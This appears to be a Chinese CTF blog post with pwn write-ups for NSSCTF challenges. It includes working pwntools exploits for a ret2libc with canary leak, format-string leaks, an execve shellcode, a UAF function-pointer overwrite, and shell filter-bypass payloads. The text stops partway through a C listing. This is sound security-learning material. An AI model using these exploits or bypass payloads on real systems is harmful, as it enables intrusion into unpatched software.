    <content type="html"><![CDATA[<ul><li>现在开始还是专心打pwn，等进度赶过来的时候再打打其他方向。</li><li>已经认清自己了，以目前半吊子的知识储备无法分心学其他方向QAQ，而且打比赛其他方向也有队友了，所以其他方向不急着学。</li></ul><h1 id="nssctf"><a class="markdownIt-Anchor" href="#nssctf"></a> NSSCTF</h1><h2 id="题目1_littleof"><a class="markdownIt-Anchor" href="#题目1_littleof"></a> 题目1_littleof</h2><ul><li><p>考点：<code>ret2libc</code>、<code>Canary绕过</code></p></li><li><p>先查看一下保护机制，发现开了Canary</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241129235605399.png" alt="image-20241129235605399"></p><ul><li>然后再反编译查看一下程序运行的逻辑。运行逻辑主要就是在下图的函数中。</li><li>这边还有俩个溢出点，但是由于有Canary，所以第一个溢出点是泄露Canary的值，然后第二个才是真正的进行溢出构造ROP链</li><li>这边还需要注意一下接收，因为<code>%s</code>除了格式化输出Canary的值，还输出了rbp栈地址的值</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241129235724940.png" alt="image-20241129235724940"></p><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241129235747714.png" alt="image-20241129235747714"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28938</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./littleof&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.send(b&#x27;a&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x49</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Do you know how to do buffer overflow?\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#p.send(b&#x27;a&#x27;)</span></span><br><span class="line">canary = p.recv()</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span> + canary[<span class="number">0x49</span>:<span class="number">0x50</span>]</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">canary = <span class="built_in">int</span>.from_bytes(canary,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi = <span class="number">0x400863</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">puts_plt = <span class="number">0x4005B0</span></span><br><span class="line">ret = <span class="number">0x40059e</span></span><br><span class="line">fun = <span class="number">0x4006E2</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi)</span><br><span class="line">payload1 += p64(puts_got) + p64(puts_plt) + p64(fun)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = puts_addr - <span class="number">0x80aa0</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x1b3e1a</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x4f550</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(sh_addr) + p64(ret) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目2_find_flag"><a class="markdownIt-Anchor" href="#题目2_find_flag"></a> 题目2_find_flag</h2><ul><li><p>考点：<code>格式化字符串漏洞</code></p></li><li><p>简单的字符串格式化的题目</p></li><li><p>先查看一下保护机制，发现全部保护都开起来了</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130003326676.png" alt="image-20241130003326676"></p><ul><li>再查看一下反编译后的程序代码，查看程序运行的逻辑，主要问题出现在这里，思路就是先泄露栈上的Canary值和ret的地址，然后计算程序的地址，然后再进行栈溢出。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130003409125.png" alt="image-20241130003409125"></p><ul><li>这里发现了后门函数</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130003600388.png" alt="image-20241130003600388"></p><ul><li>由于本地和靶机的字符串格式化偏移不一样，直接打远程，不要动态调试。</li><li>exp如下：</li><li>先通过爆破发现，<code>%17$p</code>是泄露Canary的值和<code>%19$p</code>泄露程序返回地址的值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28422</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;$p&#x27;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Hi! What\&#x27;s your name?&#x27;</span>,payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><ul><li>之后再写exp打：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28467</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%17$p&#x27;</span> + <span class="string">b&#x27;-----&#x27;</span> + <span class="string">b&#x27;%19$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Hi! What\&#x27;s your name?&#x27;</span>,payload)</span><br><span class="line">leak = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line">canary = leak[<span class="number">19</span>:<span class="number">37</span>]</span><br><span class="line">addr = leak[<span class="number">42</span>:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary----&gt;&#x27;</span>,canary)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr-----&gt;&#x27;</span>,addr)</span><br><span class="line">canary = <span class="built_in">int</span>(canary.decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(addr.decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">addr = addr - <span class="number">0x146F</span></span><br><span class="line">catflag = addr + <span class="number">0x1231</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary:&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(catflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目3_singout"><a class="markdownIt-Anchor" href="#题目3_singout"></a> 题目3_singout</h2><ul><li><p>考点：<code>RCE</code>、<code>Linux</code>命令绕过</p></li><li><p>这题没给附件，主要考虑的就是命令绕过（感觉主要靠的是web），没啥命令绕过的经验</p></li><li><p>直接看wp，wp说可以使用</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nl</span><span class="variable">$&#123;IFS&#125;</span>f*</span><br><span class="line"><span class="built_in">nl</span>$IFS<span class="variable">$9f</span>*</span><br><span class="line"><span class="built_in">tail</span> ./*</span><br><span class="line"><span class="built_in">tail</span>$IFS<span class="variable">$9</span>./f*</span><br></pre></td></tr></table></figure><ul><li>这边理解一下命令的意思：</li></ul><blockquote><p>nl是Linux系统的命令，用于给每个文件编号</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>I</mi><mi>F</mi><mi>S</mi></mrow><mtext>中，</mtext><mi>I</mi><mi>F</mi><mi>S</mi><mtext>是</mtext><mi>s</mi><mi>h</mi><mi>e</mi><mi>l</mi><mi>l</mi><mtext>特殊环境变量，代表</mtext><mo>∗</mo><mo>∗</mo><mtext>内部字段分隔符</mtext><mo>∗</mo><mo>∗</mo><mtext>这里表示空格。这边使用</mtext></mrow><annotation encoding="application/x-tex">{IFS}中，IFS是shell特殊环境变量，代表**内部字段分隔符**这里表示空格。这边使用</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">殊</span><span class="mord cjk_fallback">环</span><span class="mord cjk_fallback">境</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">表</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">内</span><span class="mord cjk_fallback">部</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">段</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">隔</span><span class="mord cjk_fallback">符</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">格</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">边</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span></span></span></span>{IFS}的作用就是充当空格，因为空格可能也被禁用了</p><p>f*表示的是当前目录下所有以f开头的文件</p><p>执行该命令的就相当于执行<code>nl f*</code></p><p>​<code>nl</code> 命令会逐行读取文件的内容，并为每一行添加行号。</p></blockquote><ul><li>这里我在本地实验一下：<ul><li>它会读取文件里面的内容。</li><li>逐行标上行号之后就会逐行输出。</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130142130803.png" alt="image-20241130142130803"></p><h2 id="题目4_shellcode"><a class="markdownIt-Anchor" href="#题目4_shellcode"></a> 题目4_shellcode？</h2><ul><li>先查看保护机制发现只有Canary没开，其他都开了</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130142520377.png" alt="image-20241130142520377"></p><ul><li>查看反编译的代码，这边应该就是简单的写一个shellcode</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130142549923.png" alt="image-20241130142549923"></p><ul><li>直接开写，虽然python有自动生成工具，但是因为是练习，所以尝试自己多写一点简单shellcode，之后要碰到要自己写的就不会太牢</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">23069</span>)</span><br><span class="line">a = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax,59</span></span><br><span class="line"><span class="string">    mov rbx,0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line">p.sendline(a)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目5_hubuctf-2022-新生赛fmt"><a class="markdownIt-Anchor" href="#题目5_hubuctf-2022-新生赛fmt"></a> 题目5_[HUBUCTF 2022 新生赛]fmt</h2><ul><li><p>考点：<code>格式化字符串漏洞</code></p></li><li><p>这题还以为是劫持got表，结果是就是格式化字符串的简单运用</p></li><li><p>直接查看附件，发现格式化字符串直接泄露栈上的值就行。</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20241130144139944.png" alt="image-20241130144139944"></p><ul><li>直接爆破flag所在的栈：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">29340</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;$p&#x27;</span>)</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><ul><li>爆破出来后直接脚本一把梭：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x657b46544353534e</span>,<span class="number">0x2d35633332386366</span>,<span class="number">0x3837342d33653834</span>,<span class="number">0x392d303432612d66</span>,<span class="number">0x3331326130306634</span>,<span class="number">0xa7d393636</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(a[i]))</span><br><span class="line"></span><br><span class="line">b = [<span class="string">&#x27;e&#123;FTCSSN&#x27;</span>,<span class="string">&#x27;-5c328cf&#x27;</span>,<span class="string">&#x27;874-3e84&#x27;</span>,<span class="string">&#x27;9-042a-f&#x27;</span>,<span class="string">&#x27;312a00f4&#x27;</span>,<span class="string">&#x27;\n&#125;966&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    <span class="built_in">print</span>(b[i][-<span class="number">1</span>::-<span class="number">1</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="题目6_nisactf-2022uaf"><a class="markdownIt-Anchor" href="#题目6_nisactf-2022uaf"></a> 题目6_[NISACTF 2022]UAF</h2><ul><li><p>考点：<code>UAF</code>、<code>fastbin_UAF</code></p></li><li><p>今天来打一题堆题，题目已经表明了是<code>UAF</code>漏洞，所以直接来分析程序。先来<code>check</code>一下程序。发现是<code>32位</code>的程序，没有开<code>PIE</code>随机地址偏移。</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115103509325.png" alt="image-20250115103509325"></p><ul><li>然后使用IDA分析该程序，发现是一个经典的堆菜单题目，然后使用<code>scanf</code>函数输入我们要选择的菜单选项。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115103618336.png" alt="image-20250115103618336"></p><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115103653093.png" alt="image-20250115103653093"></p><ul><li>接下来先查看<code>create()</code>函数，在这边有两个在<code>.bss</code>段上的全局变量<code>i</code>和<code>page</code><ul><li>该程序先输入我们申请<code>page</code>的索引，然后对这个索引进行检查，当<code>i</code>在0到9之间就会先创建一个堆块，并将堆块的地址存储在<code>page</code>这个<code>指针数组</code>这边</li><li>然后对<code>i</code>进行检查如果<code>i</code>大于9就没有<code>PAGE</code>分配给新申请的堆块，如果还有空间<code>i</code>就会自增1</li><li>当<code>i=0</code>的时候会先初始化<code>page</code>即在该堆块里面前4字节存储着一串数字，后4字节存储着函数指针，用于输出功能。</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115104133066.png" alt="image-20250115104133066"></p><ul><li>通过查看<code>.bss</code>段我们可以确定<code>i</code>是一个int类型的变量占<code>4</code>字节，而<code>page</code>很明显是一个指针数组，该数组定义了<code>10</code>个指针变量</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115105250344.png" alt="image-20250115105250344"></p><ul><li>接下来我们再来查看，<code>edit()</code>这部分函数执行什么<ul><li>首先是输入我们要修改的堆块索引</li><li>然后使用<code>scanf</code>向该堆块输入内容，但是这里好像存在溢出</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115105436837.png" alt="image-20250115105436837"></p><ul><li>之后再来查看<code>del()</code>这个函数的功能，该函数的功能就是<code>free</code>我们指定的堆块，但是这边存在一个<code>UAF</code>的漏洞，所以我们可能可以利用这个漏洞。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115105558291.png" alt="image-20250115105558291"></p><ul><li>之后再来查看<code>show</code>这个函数的功能，是输出我们所选择的堆块，但是这里要注意一下，就是当我们要输入<code>page[0]</code>的时候，程序会调用这个函数指针，即该函数指针存放在<code>page[1]</code>这个位置，然后去输出<code>page[0]</code>的内容。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115105648696.png" alt="image-20250115105648696"></p><ul><li>我们还发现了一个后门函数</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115110030686.png" alt="image-20250115110030686"></p><ul><li><p>所以思路如下：</p><ul><li>通过<code>UAF</code>漏洞修改函数指针为后门函数，然后再修改向<code>page[0][0]</code>中写入<code>/bin/sh\x00</code>或者<code>/sh\x00\x00</code></li><li>这样我们就劫持了程序的控制流到后门函数，就可以成功执行<code>system(&quot;/bin/sh&quot;)</code></li></ul></li><li><p>接下来使用动态调试查看堆块的具体运行情况</p></li><li><p>首选我们发现第一次是堆块的初始化</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250115111627174.png" alt="image-20250115111627174"></p><ul><li><p>所以我要利用<code>UAF</code>漏洞，将该对<code>page[0]</code>这里面的内容进行修改从而执行程序控制流，接下来进行堆的布局。首先我们要先初始化一个<code>page</code>，为了防止堆块的合并，我们还要再申请一个堆块。之后先释放<code>page[0]</code>所指向的堆块，再创建一个新的堆块就可以把<code>page[0]</code>的堆块给申请到<code>page[2]</code>这边，这样我们就可以调用<code>edit</code>函数对这个堆块进行修改了。</p></li><li><p>exp如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28471</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">page,string</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input page\n&#x27;</span>,<span class="built_in">str</span>(page).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input your strings\n&#x27;</span>,string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">page</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input page\n&#x27;</span>,<span class="built_in">str</span>(page).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">page</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input page\n&#x27;</span>,<span class="built_in">str</span>(page).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">create()</span><br><span class="line">create()</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create()</span><br><span class="line">payload = <span class="string">b&#x27;\sh\x00&#x27;</span> + p32(<span class="number">0x8048642</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="题目7_hnctf-2022-week1ezcmp"><a class="markdownIt-Anchor" href="#题目7_hnctf-2022-week1ezcmp"></a> 题目7_[HNCTF 2022 Week1]ezcmp</h2><ul><li><p>考点：<code>gdb动态调试</code></p></li><li><p>该题比较简单，不仅给了附件，还给了源码。这边直接查看一下源码</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> v0;</span><br><span class="line"><span class="type">char</span> buffff[]=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234&quot;</span>;</span><br><span class="line"><span class="type">char</span> bua[]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz4321&quot;</span>;</span><br><span class="line"><span class="type">char</span>* <span class="title function_">enccrypt</span><span class="params">(<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">29</span>;i++)&#123;</span><br><span class="line">        a=rand();</span><br><span class="line">        buf[i]^=buffff[i];</span><br><span class="line">        buff[i]^=bua[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">29</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line">            buf[j]=buff[i];</span><br><span class="line">            buf[i]+=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buf[i]-=((bua[i]^<span class="number">0x30</span>)*(buffff[i]&gt;&gt;<span class="number">2</span>)&amp;<span class="number">1</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">        buf[i]+=(a%buff[i])&amp;<span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">  